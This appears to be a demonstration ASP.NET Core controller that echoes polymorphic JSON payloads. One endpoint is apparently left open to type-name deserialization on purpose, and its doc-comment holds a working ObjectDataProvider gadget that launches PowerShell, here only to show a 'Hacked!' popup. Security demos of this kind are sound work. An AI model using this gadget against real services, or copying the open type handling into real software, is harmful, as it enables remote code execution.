using System;
using System.Net;
using System.Net.Http.Headers;
using System.Runtime.CompilerServices;
using Microsoft.AspNetCore.Mvc;
using Microsoft.OpenApi.Extensions;
using Swashbuckle.AspNetCore.Annotations;

namespace openapi_clients.Controllers;

[ApiController]
[Route("[controller]")]
public class WeatherForecastController : ControllerBase
{
    public WeatherForecastController()
    {
    }

    [HttpGet]
    public IResult Get() => Ok<object>(new Dog(""));

    [HttpPost]
    public IResult Post(KnownType payload) => Ok(payload);

    [HttpPost("Form")]
    public IResult PostForm([FromForm] KnownType payload) => Ok(payload);

    [HttpPost("Inheritance")]
    public IResult PostInheritance([FromBody] Animal payload) => Ok(payload);

    [HttpPost("HeaderComplexType")]
    public IResult PostHeader([FromHeader] KnownType payload) => Ok(payload);

    /// <remarks>
    /// <code>
    /// { 
    /// "someString": "string",  
    /// "someValueThatCanBeIntegerOrString": {
    ///    "$type": "System.IO.DriveInfo, System.IO.FileSystem.DriveInfo", 
    ///    "driveName": "d",
    ///    "VolumeLabel": "Nowa nazwa 2021/10 4 53"
    ///  }
    /// }
    /// {
    ///   "someString": "string",
    ///   "someValueThatCanBeIntegerOrString": {
    ///     "$type": "System.Windows.Data.ObjectDataProvider,    PresentationFramework",
    ///     "MethodName": "Start",
    ///     "MethodParameters": {
    ///       "$type": "System.Collections.ArrayList, mscorlib",
    ///       "$values": [
    ///         "powershell",
    ///         "-c (New-Object -ComObject Wscript.Shell).Popup('Hacked!',0,'Done',0x1)"
    ///       ]
    ///     },
    ///     "ObjectInstance": {
    ///       "$type": "System.Diagnostics.Process, System"
    ///     }
    ///   }
    /// }
    /// </code>
    /// </remarks>
    /// <param name="payload"></param>
    /// <returns></returns>
    [HttpPost("HeaderComplexTypeRce")]
    public IResult PostHeader(KnownTypeWithRce payload) => Ok(payload);

    [HttpPost("HeaderString")]
    public IResult PostHeaderString([FromHeader] string payload) => Ok(payload);

    /// <param name="animal" example="{type: &quot;openapi_clients.Controllers.Dog&quot;, bark: &quot;&quot;}" />
    [HttpPatch()]
    [ProducesResponseType(typeof(Animal), (int)HttpStatusCode.OK)]
    public IResult Patch(Animal animal) => Ok(animal);

    private IResult Ok<T>(
        T? o = default,
        [CallerArgumentExpression("o")] string? name = default)
        => Results.Ok(new { name, o, type = o?.GetType() });
}
